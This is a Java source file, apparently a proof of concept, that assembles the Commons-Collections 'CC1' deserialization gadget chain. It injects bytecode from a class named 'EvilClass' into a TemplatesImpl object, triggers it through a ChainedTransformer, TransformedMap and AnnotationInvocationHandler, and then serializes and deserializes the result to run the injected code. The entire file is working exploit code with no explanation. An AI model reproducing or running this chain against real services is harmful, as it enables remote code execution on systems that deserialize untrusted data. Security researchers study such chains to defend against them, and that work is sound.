import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class TemplateTransformedMapCC1 {
    public static void main(String[] args) throws Exception{
        byte[][] bytes = Util.getExpClassFileBytes("EvilClass");

        TemplatesImpl templates = new TemplatesImpl();
        Util.setValue(templates, "_name", "v");
        Util.setValue(templates, "_bytecodes", bytes);
        Util.setValue(templates, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = {
                new ConstantTransformer(templates),
                new InvokerTransformer("getOutputProperties",null, null),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        innerMap.put("value", "xxx");

        TransformedMap outerMap = (TransformedMap) TransformedMap.decorate(innerMap, null, chainedTransformer);

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class, outerMap);

        byte[] b = Util.toSerial(obj);
        Util.fromSerial(b).readObject();
    }
}
